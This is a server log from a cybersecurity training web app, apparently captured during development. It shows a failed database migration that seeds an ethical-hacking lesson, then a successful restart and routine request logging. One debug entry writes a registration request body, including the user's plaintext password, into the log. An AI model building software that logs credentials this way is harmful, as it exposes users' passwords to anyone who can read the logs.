	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:244)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V2__Sample_Learning_Content.sql failed
------------------------------------------------
SQL State  : 42703
Error Code : 0
Message    : ERROR: column "content_json" of relation "lessons" does not exist
  Position: 157
Location   : db/migration/V2__Sample_Learning_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V2__Sample_Learning_Content.sql)
Line       : 36
Statement  : -- Lesson 1: Introduction to Ethical Hacking (JSONB Content)
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes, content_json, metadata, content_source)
VALUES (
    1,
    'Introduction to Ethical Hacking',
    'Ethical hacking is the practice of testing computer systems, networks, or applications to find security vulnerabilities that malicious hackers could exploit.',
    'text',
    1,
    15,
    '{
        "title": "Introduction to Ethical Hacking",
        "sections": [
            {
                "heading": "What is Ethical Hacking?",
                "content": "Ethical hacking, also known as penetration testing or white-hat hacking, is the practice of intentionally probing computer systems, networks, and applications to discover security vulnerabilities before malicious actors can exploit them. Ethical hackers use the same tools and techniques as cybercriminals, but with authorization and the goal of improving security."
            },
            {
                "heading": "The Role of Ethical Hackers",
                "content": "Ethical hackers play a crucial role in modern cybersecurity by:",
                "list": [
                    "Identifying security weaknesses before they can be exploited",
                    "Testing the effectiveness of security controls",
                    "Validating compliance with security policies",
                    "Providing actionable recommendations for remediation",
                    "Helping organizations understand their security posture"
                ]
            },
            {
                "heading": "Key Principles",
                "content": "Ethical hacking is guided by several fundamental principles:",
                "subsections": [
                    {
                        "subheading": "Authorization",
                        "content": "Always obtain written permission before testing any system. Unauthorized access is illegal, regardless of intent."
                    },
                    {
                        "subheading": "Scope Definition",
                        "content": "Clearly define what systems, networks, and applications are in scope for testing. Never exceed the agreed-upon boundaries."
                    },
                    {
                        "subheading": "Confidentiality",
                        "content": "Maintain strict confidentiality of all findings and sensitive information discovered during testing."
                    },
                    {
                        "subheading": "Responsible Disclosure",
                        "content": "Report vulnerabilities responsibly to the organization and allow time for remediation before public disclosure."
                    }
                ]
            },
            {
                "heading": "Career Opportunities",
                "content": "The field of ethical hacking offers diverse career paths including penetration tester, security consultant, bug bounty hunter, and security researcher. The demand for skilled ethical hackers continues to grow as organizations recognize the importance of proactive security testing."
            }
        ]
    }'::jsonb,
    '{
        "difficulty": "beginner",
        "estimatedMinutes": 15,
        "prerequisites": [],
        "learningObjectives": [
            "Define ethical hacking and its purpose",
            "Understand the role of ethical hackers in cybersecurity",
            "Recognize key principles guiding ethical hacking",
            "Identify career opportunities in ethical hacking"
        ],
        "tags": ["ethical-hacking", "introduction", "cybersecurity", "career"],
        "author": "CyberSkill Team",
        "lastUpdated": "2026-03-12",
        "version": "1.0"
    }'::jsonb,
    'json'
)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: column "content_json" of relation "lessons" does not exist
  Position: 157
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 01:20:22.795 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 01:20:22.798 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 01:20:22.917 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 01:20:23.054 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 01:20:23.055 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 01:20:23.055 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 01:20:23.262 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 01:20:23.305 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Schema history table "public"."flyway_schema_history" does not exist yet
2026-03-12 01:20:23.309 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 3 migrations (execution time 00:00.024s)
2026-03-12 01:20:23.331 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Creating Schema History table "public"."flyway_schema_history" ...
2026-03-12 01:20:23.590 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": << Empty Schema >>
2026-03-12 01:20:23.643 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "1 - Initial Schema"
2026-03-12 01:20:24.205 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "2 - Sample Learning Content"
2026-03-12 01:20:24.277 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
2026-03-12 01:20:24.311 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Successfully applied 3 migrations to schema "public", now at version v3 (execution time 00:00.604s)
2026-03-12 01:20:24.320 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Applied 3 database migration(s)
2026-03-12 01:20:24.321 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing database connection pool...
2026-03-12 01:20:24.347 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Database connection pool initialized
2026-03-12 01:20:24.348 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing repositories...
2026-03-12 01:20:24.363 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Repositories initialized
2026-03-12 01:20:24.364 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing services...
2026-03-12 01:20:24.370 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Services initialized
2026-03-12 01:20:24.372 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing handlers...
2026-03-12 01:20:24.379 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Handlers initialized
2026-03-12 01:20:24.604 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ CyberSkill Platform started successfully
2026-03-12 01:20:24.605 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Server listening on http://0.0.0.0:8080
2026-03-12 01:20:24.605 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ API available at http://0.0.0.0:8080/api
2026-03-12 01:20:24.605 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Admin dashboard at http://0.0.0.0:8080/admin
2026-03-12 01:20:24.608 [vert.x-eventloop-thread-0] INFO  i.v.c.i.l.c.VertxIsolatedDeployer - Succeeded in deploying verticle
2026-03-12 01:20:32.326 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /
2026-03-12 01:20:32.326 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET / - Rendering home page
2026-03-12 01:20:32.732 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Home page rendered successfully with 7 learning paths
2026-03-12 01:20:32.806 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 01:20:32.813 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /js/main.js
2026-03-12 01:20:32.874 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 01:20:44.890 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /login
2026-03-12 01:20:44.890 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /login - Rendering login page
2026-03-12 01:20:44.921 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Login page rendered successfully
2026-03-12 01:20:44.998 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 01:20:45.026 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 01:20:55.615 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /register
2026-03-12 01:20:55.615 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /register - Rendering registration page
2026-03-12 01:20:55.642 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Register page rendered successfully
2026-03-12 01:20:55.728 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 01:20:55.757 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 01:22:18.746 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - POST /api/auth/register
2026-03-12 01:22:18.746 [vert.x-eventloop-thread-1] INFO  com.cyberskill.handler.AuthHandler - 🔐 POST /api/auth/register - Registration request received
2026-03-12 01:22:18.764 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.handler.AuthHandler - Request body: {
  "username" : "jcmail",
  "email" : "jc@mail.com",
  "password" : "Test@123"
}
2026-03-12 01:22:18.766 [vert.x-eventloop-thread-1] INFO  com.cyberskill.handler.AuthHandler - Registration attempt for username: jcmail, email: jc@mail.com
2026-03-12 01:22:18.766 [vert.x-eventloop-thread-1] INFO  com.cyberskill.handler.AuthHandler - Calling authService.register() for user: jcmail
2026-03-12 01:22:18.766 [vert.x-eventloop-thread-1] INFO  com.cyberskill.service.AuthService - Attempting to register user: jc@mail.com
2026-03-12 01:22:19.048 [vert.x-eventloop-thread-1] INFO  c.c.repository.UserRepository - Created user: jcmail
2026-03-12 01:22:19.048 [vert.x-eventloop-thread-1] INFO  com.cyberskill.service.AuthService - User registered successfully: jc@mail.com
2026-03-12 01:22:19.054 [vert.x-eventloop-thread-1] INFO  com.cyberskill.handler.AuthHandler - ✅ Registration successful for user: jcmail
2026-03-12 01:22:21.083 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /login
2026-03-12 01:22:21.083 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /login - Rendering login page
2026-03-12 01:22:21.083 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Login page rendered successfully
2026-03-12 01:22:38.496 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - POST /api/auth/login
2026-03-12 01:22:38.496 [vert.x-eventloop-thread-1] INFO  com.cyberskill.service.AuthService - Login attempt for: jc@mail.com
2026-03-12 01:22:38.745 [vert.x-eventloop-thread-1] INFO  com.cyberskill.service.AuthService - User logged in successfully: jc@mail.com
2026-03-12 01:22:39.764 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /dashboard
2026-03-12 01:22:39.764 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /dashboard - Rendering dashboard
2026-03-12 01:22:39.787 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Dashboard rendered successfully
2026-03-12 01:22:39.911 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths
2026-03-12 01:22:39.916 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LearningService - Retrieved 7 active learning paths
2026-03-12 01:22:57.634 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /learning/path/1
2026-03-12 01:22:57.639 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📚 GET /learning/path/1 - Rendering learning path
2026-03-12 01:22:57.655 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Learning path page rendered successfully
2026-03-12 01:22:57.716 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths/1
2026-03-12 01:22:57.729 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths/1/modules
2026-03-12 01:22:57.736 [vert.x-eventloop-thread-1] DEBUG c.c.repository.ModuleRepository - Found 5 modules for path 1
2026-03-12 01:22:57.736 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.ModuleService - Retrieved 5 modules for path 1
2026-03-12 01:22:57.747 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/1/sections
2026-03-12 01:22:57.756 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/2/sections
2026-03-12 01:22:57.760 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/3/sections
2026-03-12 01:22:57.766 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/5/sections
2026-03-12 01:22:57.767 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/4/sections
2026-03-12 01:22:57.779 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 3 sections for module 1
2026-03-12 01:22:57.779 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 3 sections for module 1
2026-03-12 01:22:57.892 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 3
2026-03-12 01:22:57.893 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 3
2026-03-12 01:22:57.895 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 4
2026-03-12 01:22:57.895 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 4
2026-03-12 01:22:57.897 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 5
2026-03-12 01:22:57.897 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 5
2026-03-12 01:22:57.897 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 2
2026-03-12 01:22:57.897 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 2
2026-03-12 01:23:16.004 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/1/lessons
2026-03-12 01:23:16.010 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 1
2026-03-12 01:23:16.012 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 1
2026-03-12 01:23:18.032 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /lesson/1
2026-03-12 01:23:18.032 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📖 GET /lesson/1 - Rendering lesson
2026-03-12 01:23:18.059 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Lesson page rendered successfully
2026-03-12 01:23:18.107 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/lessons/1
2026-03-12 01:23:18.127 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/1/lessons
2026-03-12 01:23:18.129 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 1
2026-03-12 01:23:18.131 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 1
2026-03-12 01:23:23.150 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /dashboard
2026-03-12 01:23:23.150 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /dashboard - Rendering dashboard
2026-03-12 01:23:23.151 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Dashboard rendered successfully
2026-03-12 01:23:23.192 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths
2026-03-12 01:23:23.194 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LearningService - Retrieved 7 active learning paths
2026-03-12 01:23:25.486 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /learning/path/1
2026-03-12 01:23:25.486 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📚 GET /learning/path/1 - Rendering learning path
2026-03-12 01:23:25.486 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Learning path page rendered successfully
2026-03-12 01:23:25.515 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths/1
2026-03-12 01:23:25.522 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths/1/modules
2026-03-12 01:23:25.527 [vert.x-eventloop-thread-1] DEBUG c.c.repository.ModuleRepository - Found 5 modules for path 1
2026-03-12 01:23:25.527 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.ModuleService - Retrieved 5 modules for path 1
2026-03-12 01:23:25.558 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/1/sections
2026-03-12 01:23:25.559 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/2/sections
2026-03-12 01:23:25.563 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/3/sections
2026-03-12 01:23:25.565 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/4/sections
2026-03-12 01:23:25.567 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/5/sections
2026-03-12 01:23:25.573 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 3 sections for module 1
2026-03-12 01:23:25.575 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 3 sections for module 1
2026-03-12 01:23:25.579 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 2
2026-03-12 01:23:25.579 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 2
2026-03-12 01:23:25.580 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 3
2026-03-12 01:23:25.582 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 3
2026-03-12 01:23:25.584 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 4
2026-03-12 01:23:25.584 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 4
2026-03-12 01:23:25.584 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 5
2026-03-12 01:23:25.584 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 5
2026-03-12 01:23:26.723 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/2/lessons
2026-03-12 01:23:26.723 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 2
2026-03-12 01:23:26.723 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 2
2026-03-12 01:23:28.406 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/3/lessons
2026-03-12 01:23:28.406 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 3
2026-03-12 01:23:28.406 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 3
2026-03-12 01:23:44.746 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/1/lessons
2026-03-12 01:23:44.746 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 1
2026-03-12 01:23:44.746 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 1
2026-03-12 01:23:45.836 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /lesson/1
2026-03-12 01:23:45.836 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📖 GET /lesson/1 - Rendering lesson
2026-03-12 01:23:45.836 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Lesson page rendered successfully
2026-03-12 01:23:45.876 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/lessons/1
2026-03-12 01:23:45.886 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/1/lessons
2026-03-12 01:23:45.890 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 1
2026-03-12 01:23:45.892 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 1
2026-03-12 01:23:50.822 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /dashboard
2026-03-12 01:23:50.822 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /dashboard - Rendering dashboard
2026-03-12 01:23:50.822 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Dashboard rendered successfully
2026-03-12 01:23:50.871 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths
2026-03-12 01:23:50.873 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LearningService - Retrieved 7 active learning paths
2026-03-12 01:23:54.884 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /learning/path/1
2026-03-12 01:23:54.886 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📚 GET /learning/path/1 - Rendering learning path
2026-03-12 01:23:54.886 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Learning path page rendered successfully
2026-03-12 01:23:54.915 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths/1
2026-03-12 01:23:54.924 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths/1/modules
2026-03-12 01:23:54.926 [vert.x-eventloop-thread-1] DEBUG c.c.repository.ModuleRepository - Found 5 modules for path 1
2026-03-12 01:23:54.929 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.ModuleService - Retrieved 5 modules for path 1
2026-03-12 01:23:54.942 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/1/sections
2026-03-12 01:23:54.948 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/2/sections
2026-03-12 01:23:54.951 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/3/sections
2026-03-12 01:23:54.952 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/4/sections
2026-03-12 01:23:54.954 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/5/sections
2026-03-12 01:23:54.955 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 3 sections for module 1
2026-03-12 01:23:54.955 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 3 sections for module 1
2026-03-12 01:23:54.957 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 2
2026-03-12 01:23:54.957 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 2
2026-03-12 01:23:54.957 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 3
2026-03-12 01:23:54.957 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 3
2026-03-12 01:23:54.957 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 4
2026-03-12 01:23:54.957 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 4
2026-03-12 01:23:54.964 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 5
2026-03-12 01:23:54.964 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 5
2026-03-12 01:23:55.912 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/2/lessons
2026-03-12 01:23:55.914 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 2
2026-03-12 01:23:55.914 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 2
2026-03-12 01:23:58.104 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /lesson/2
2026-03-12 01:23:58.104 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📖 GET /lesson/2 - Rendering lesson
2026-03-12 01:23:58.105 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Lesson page rendered successfully
2026-03-12 01:23:58.154 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/lessons/2
2026-03-12 01:23:58.164 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/2/lessons
2026-03-12 01:23:58.164 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 2
2026-03-12 01:23:58.164 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 2
2026-03-12 01:24:07.717 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /dashboard
2026-03-12 01:24:07.717 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /dashboard - Rendering dashboard
2026-03-12 01:24:07.722 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Dashboard rendered successfully
